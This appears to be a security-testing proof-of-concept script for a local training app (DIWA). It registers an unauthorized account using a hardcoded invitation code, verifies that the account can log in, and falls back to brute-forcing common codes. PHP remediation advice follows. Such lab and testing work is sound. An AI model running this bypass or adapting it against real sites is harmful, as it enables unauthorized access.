#!/usr/bin/env python3
"""
Stage 2 POC: Hardcoded Invitation Code Bypass
Target: http://127.0.0.1:8080 (local DIWA instance only - authorized testing)
Vulnerability: Invitation code hardcoded in config.php and checked in plain text
"""

import requests
import sys
import uuid

TARGET = "http://127.0.0.1:8080"
SESSION = requests.Session()

def test_hardcoded_invitation_code():
    """
    Attempt registration with known hardcoded invitation code from config.php
    Payload: invitation_code=3702 (from config.php)
    Expected: Account created without authorization (code is publicly known)
    """
    print("[*] Testing Hardcoded Invitation Code Bypass...")
    
    try:
        # Get registration page to check for invitation code input
        resp = SESSION.get(f"{TARGET}/?page=register")
        
        if 'invitation' not in resp.text.lower() and 'invite' not in resp.text.lower():
            print("❌ NOT REPRODUCIBLE: Registration doesn't require invitation code")
            return False
        
        # Try registering with the hardcoded code from config.php
        unique_id = str(uuid.uuid4())[:8]
        register_payload = {
            'username': f'hacker{unique_id}',
            'email': f'hacker{unique_id}@example.com',
            'password': 'TestPassword123!',
            'password_check': 'TestPassword123!',
            'country': 'Attacker',
            'invitation_code': '3702'  # Known hardcoded code
        }
        
        resp_register = SESSION.post(f"{TARGET}/?page=register", data=register_payload)
        
        # Check for success
        if 'registered' in resp_register.text.lower() or 'success' in resp_register.text.lower():
            print("✅ VULNERABLE: Registration succeeded with hardcoded invitation code")
            
            # Verify we can login with the new account
            login_payload = {
                'email': register_payload['email'],
                'password': register_payload['password']
            }
            resp_login = SESSION.post(f"{TARGET}/?page=login", data=login_payload)
            
            if SESSION.cookies.get('PHPSESSID') or 'loggedin' in resp_login.text.lower():
                print("✅ VULNERABLE: New account is functional - registration bypass complete")
                return True
            
            return True
        
        # Try other common codes
        common_codes = ['1234', '0000', '12345', '999999', 'default', 'admin']
        for code in common_codes:
            register_payload['invitation_code'] = code
            register_payload['username'] = f'test{unique_id}{code}'
            register_payload['email'] = f'test{unique_id}{code}@example.com'
            
            resp = SESSION.post(f"{TARGET}/?page=register", data=register_payload)
            if 'registered' in resp.text.lower():
                print(f"✅ VULNERABLE: Registration succeeded with code: {code}")
                return True
        
        print("❌ NOT REPRODUCIBLE: Registration requires valid invitation code")
        return False
        
    except Exception as e:
        print(f"❌ NOT REPRODUCIBLE: Error - {e}")
        return False

if __name__ == '__main__':
    result = test_hardcoded_invitation_code()
    sys.exit(0 if result else 1)

"""
REMEDIATION:
Implement proper registration control: generate unique codes or require admin approval:

  // Option 1: Generate unique, expiring invitation codes
  // In database schema:
  // CREATE TABLE invitation_codes (
  //     id INTEGER PRIMARY KEY,
  //     code VARCHAR(32) UNIQUE,
  //     created_at TIMESTAMP,
  //     expires_at TIMESTAMP,
  //     used_by_user_id INTEGER,
  //     created_by_user_id INTEGER
  // );
  
  // In registration validation:
  public function isInvitationCodeValid($pCode) {
      try {
          $now = new DateTime();
          $stmt = $this->db->prepare(
              'SELECT * FROM ' . $this->prefix . 'invitation_codes 
               WHERE code = ? AND expires_at > ? AND used_by_user_id IS NULL'
          );
          $stmt->execute([$pCode, $now->format('Y-m-d H:i:s')]);
          return $stmt->fetch() !== false;
      }
      catch(Exception $ex) {
          error(500, 'Query could not be executed', $ex);
      }
  }
  
  // In registration form:
  if ('post' === strtolower($_SERVER['REQUEST_METHOD'])) {
      if (!$model->isInvitationCodeValid($_POST['invitation_code'])) {
          $errors[] = 'Invalid or expired invitation code.';
      }
      // ... other validation ...
      if (empty($errors)) {
          $model->createUser(...);
          $model->markInvitationCodeUsed($_POST['invitation_code'], $new_user_id);
      }
  }
  
  // Option 2: Require admin approval (no codes)
  // - Close registration by default
  // - Admin manually creates accounts or approves signups
  // - Check is_admin on registration page

Key points:
- Never hardcode secrets or credentials in source code
- Generate unique codes for each invitation
- Add expiration dates to codes
- Track which code was used by whom
- Alternatively: closed registration (admin only)
- Store sensitive config in environment variables, not PHP files
- Use .env files loaded via getenv() or $_ENV
"""
